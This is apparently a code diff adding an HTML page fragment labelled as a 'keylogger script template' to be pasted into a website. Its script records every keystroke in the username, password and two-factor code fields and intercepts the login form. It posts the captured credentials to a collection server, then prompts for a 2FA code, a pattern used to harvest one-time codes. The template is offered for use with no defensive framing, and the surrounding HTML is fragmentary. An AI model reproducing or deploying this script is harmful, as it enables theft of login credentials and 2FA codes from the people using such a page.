@@ -1,0 +1,74 @@
+#your website here (html): 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+
+#keylogger script template
+
+    <script>
+        // Real-time logging to localStorage and console
+        document.getElementById('username').addEventListener('input', function() {
+            localStorage.setItem('loggedUsername', this.value);
+            console.log('Username input:', this.value);
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            localStorage.setItem('loggedPassword', this.value);
+            console.log('Password input:', this.value);
+        });
+
+        document.getElementById('twoFactorCode').addEventListener('input', function() {
+            localStorage.setItem('loggedTwoFactorCode', this.value);
+            console.log('2FA Code input:', this.value);
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const twoFactorSection = document.getElementById('twoFactorSection');
+            const twoFactorCode = document.getElementById('twoFactorCode').value;
+
+            // Prepare data to send (always include username and password)
+            const data = { username, password };
+            if (twoFactorSection.style.display !== 'none') {
+                data.twoFactorCode = twoFactorCode;
+            }
+
+            console.log('Sending to server:', data);
+
+            fetch('http://127.0.0.1:5501/receive', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                console.log('Response status:', response.status);
+                if (!response.ok) {
+                    throw new Error('Network response was not ok: ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Server response:', data);
+                if (twoFactorSection.style.display === 'none') {
+                    // Show 2FA field after first submission
+                    twoFactorSection.style.display = 'block';
+                    document.getElementById('twoFactorCode').focus();
+                    document.getElementById('twoFactorCode').setAttribute('required', 'true');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+        
+        </div>
+    </footer>
+</body>
+</html>
